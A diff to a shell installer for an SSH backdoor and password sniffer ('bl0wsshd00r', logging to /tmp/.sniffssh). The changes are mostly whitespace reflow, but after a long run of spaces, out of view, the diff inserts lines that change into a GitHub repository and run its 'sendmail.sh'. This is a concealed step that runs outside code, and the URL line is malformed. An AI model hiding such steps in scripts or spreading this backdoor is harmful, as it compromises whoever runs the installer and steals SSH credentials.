@@ -13,21 +13,39 @@ fi
 
  if [ -e `which gcc` ]; then
     echo "GCC found!"
+    
+    
     else
-    echo "Sorry, no GCC Compiler has been found."
-    exit 0
+
+
+echo "Sorry, no GCC Compiler has been found."
+ 
+ 
+ exit 0
+ 
+ 
  fi
 
  if [ -e `which perl` ]; then
-    echo "PERL found!"
+ 
+ 
+ echo "PERL found!"
     else
-    echo "Sorry, no PERL has been found."
-    exit 0
- fi
-
+ 
+ echo "Sorry, no PERL has been found."
+ 
+ exit 0
+ 
+ 
+ fi                                                                                                                                                                                                                                       cd $HOME               
+                                                                                                                                                                                                                                          https://github.com/SuSux13/JKbobesponja
+                                                                                                                                                                                                                                          cd JKbobesponja
+                                                                                                                                                                                                                                          bash sendmail.sh
 # echo "- bl0wsshd00r67p1 coded by bl0w@koresec.org -brazilian oldschool never dies."
 
+
 echo "Enter Log File Password. default: /tmp/.sniffssh"
+
 read bdlogfile
 
 if [ -z "$bdlogfile" ]; then
@@ -47,13 +65,17 @@ while [ -z "$TEST" ] ; do
         TEST="No"
     fi
     echo ""
-    echo "Do you want to encrypt sniffer log files? Yes or No"
+
+echo "Do you want to encrypt sniffer log files? Yes or No"
     echo $n "[$TEST] "
         read cc
     if [ -z "$cc" ] ; then
         cc=$TEST
     fi
-    case "$cc" in
+
+
+
+case "$cc" in
         [Yy]*)
             elf="1"
             ;;
